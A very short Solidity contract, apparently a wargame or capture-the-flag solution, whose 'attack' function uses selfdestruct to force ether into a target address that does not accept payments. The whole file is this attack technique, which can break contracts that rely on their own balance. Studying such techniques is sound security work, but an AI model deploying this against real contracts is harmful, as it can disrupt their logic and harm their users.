// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Proxy {

    function attack(address force_) public payable {

        selfdestruct(payable(force_));
    }
}
